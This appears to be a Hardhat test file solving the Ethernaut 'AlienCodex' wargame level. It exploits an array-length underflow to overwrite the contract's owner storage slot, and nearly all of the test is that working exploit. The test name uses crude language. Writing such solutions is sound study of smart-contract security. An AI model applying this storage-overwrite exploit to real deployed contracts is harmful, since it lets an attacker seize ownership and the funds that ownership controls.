import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";
import { AlienCodex } from "../typechain-types";

describe("AlienCodex", function () {

  let alienCodex: AlienCodex;

  beforeEach(async function () {
    const alienCodexFactory = await ethers.getContractFactory("AlienCodex");
    alienCodex = await alienCodexFactory.deploy();
    await alienCodex.deployed();

  });

  it("Should fuck AlienCodex success", async function () {
    await alienCodex.make_contact();

    await alienCodex.retract();

    const arrayStartSlot = ethers.utils.solidityKeccak256(['uint'], [1]);
    const maxBytes32 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const ownerIndex = BigNumber.from(maxBytes32).sub(BigNumber.from(arrayStartSlot)).add(1);

    const accounts = await ethers.getSigners();

    await alienCodex.revise(ownerIndex, '0x000000000000000000000000' + accounts[1].address.slice(2));


    expect(await alienCodex.owner()).to.eq(accounts[1].address);

  });

});
